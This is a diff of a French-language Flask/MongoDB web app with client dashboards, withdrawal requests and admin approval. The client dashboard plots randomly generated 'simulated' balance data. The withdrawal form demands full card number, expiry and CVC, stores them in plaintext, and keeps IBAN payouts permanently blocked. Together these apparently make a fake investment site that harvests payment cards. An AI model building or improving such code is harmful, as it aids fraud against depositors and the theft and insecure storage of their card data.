@@ -96,9 +96,8 @@ def dashboard():
         clients = list(db.users.find({"role": "client"}))
         return render_template('dashboard.html', is_admin=True, users=clients, admin=user)
     else:
-        # Pour le client : données simulées
+        # Données simulées pour le client
         balance = user.get('balance', 0)
-        # Exemple : données chart fictives
         from random import uniform
         chart_data = [round(balance * (1 + uniform(-0.02, 0.05)), 2) for _ in range(10)]
         chart_labels = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]
@@ -120,33 +119,32 @@ def withdraw():
     if user['role'] != 'client':
         return "Accès refusé.", 403
 
+    iban_enabled = False  # Mode IBAN désactivé
+
     if request.method == 'POST':
         amount = request.form.get('amount')
         withdraw_type = request.form.get('withdraw_type')
 
-        # Validation montant
         try:
             amount = float(amount)
             if amount <= 0:
                 raise ValueError()
         except:
             flash("Montant invalide.", "error")
-            return render_template('withdraw.html')
+            return render_template('withdraw.html', iban_enabled=iban_enabled)
 
         if amount > user.get('balance', 0):
             flash("Montant supérieur à votre solde.", "error")
-            return render_template('withdraw.html')
+            return render_template('withdraw.html', iban_enabled=iban_enabled)
 
         if withdraw_type not in ['carte', 'iban', 'identification_bancaire']:
             flash("Méthode de retrait invalide.", "error")
-            return render_template('withdraw.html')
+            return render_template('withdraw.html', iban_enabled=iban_enabled)
 
-        # Blocage temporaire du mode IBAN
         if withdraw_type == 'iban':
             flash("Mode de retrait momentanément indisponible.", "error")
-            return render_template('withdraw.html')
+            return render_template('withdraw.html', iban_enabled=iban_enabled)
 
-        # Collecte données selon méthode
         withdrawal = {
             'user_id': user['_id'],
             'username': user['username'],
@@ -163,19 +161,19 @@ def withdraw():
             card_cvc = request.form.get('card_cvc', '').strip()
             if not all([card_number, card_name, card_expiry, card_cvc]):
                 flash("Veuillez remplir tous les champs de la carte.", "error")
-                return render_template('withdraw.html')
+                return render_template('withdraw.html', iban_enabled=iban_enabled)
 
             if not re.fullmatch(r"\d{13,19}", card_number.replace(' ', '')):
                 flash("Numéro de carte invalide.", "error")
-                return render_template('withdraw.html')
+                return render_template('withdraw.html', iban_enabled=iban_enabled)
 
             if not re.fullmatch(r"(0[1-9]|1[0-2])\/\d{2}", card_expiry):
                 flash("Date d'expiration invalide (MM/AA).", "error")
-                return render_template('withdraw.html')
+                return render_template('withdraw.html', iban_enabled=iban_enabled)
 
             if not re.fullmatch(r"\d{3,4}", card_cvc):
                 flash("Code CVC invalide.", "error")
-                return render_template('withdraw.html')
+                return render_template('withdraw.html', iban_enabled=iban_enabled)
 
             withdrawal.update({
                 'card_number': card_number,
@@ -189,22 +187,18 @@ def withdraw():
             account_number = request.form.get('account_number', '').strip()
             if not bank_name or not account_number:
                 flash("Veuillez remplir tous les champs bancaires.", "error")
-                return render_template('withdraw.html')
+                return render_template('withdraw.html', iban_enabled=iban_enabled)
             withdrawal.update({
                 'bank_name': bank_name,
                 'account_number': account_number
             })
 
-        # Enregistrer la demande retrait
         db.withdrawals.insert_one(withdrawal)
-
-        # Déduire solde client (optionnel, ou après validation admin)
         db.users.update_one({'_id': user['_id']}, {'$inc': {'balance': -amount}})
-
         flash("Demande de retrait enregistrée avec succès.", "success")
         return redirect(url_for('dashboard'))
 
-    return render_template('withdraw.html')
+    return render_template('withdraw.html', iban_enabled=iban_enabled)
 
 @app.route('/withdraw_requests')
 def withdraw_requests():
@@ -238,23 +232,19 @@ def process_withdraw(withdraw_id, action):
         db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Approuvé", "processed_date": datetime.datetime.now()}})
         flash("Retrait approuvé.", "success")
     elif action == 'reject':
-        # Remettre solde client si rejet
         db.users.update_one({'_id': withdrawal['user_id']}, {'$inc': {'balance': withdrawal['amount']}})
         db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Rejeté", "processed_date": datetime.datetime.now()}})
         flash("Retrait rejeté et solde remboursé.", "success")
 
     return redirect(url_for('withdraw_requests'))
 
-# Page 403
 @app.errorhandler(403)
 def forbidden(e):
     return render_template('403.html'), 403
 
-# Page 404
 @app.errorhandler(404)
 def not_found(e):
     return render_template('404.html'), 404
 
-# Run
 if __name__ == '__main__':
     app.run(debug=True)
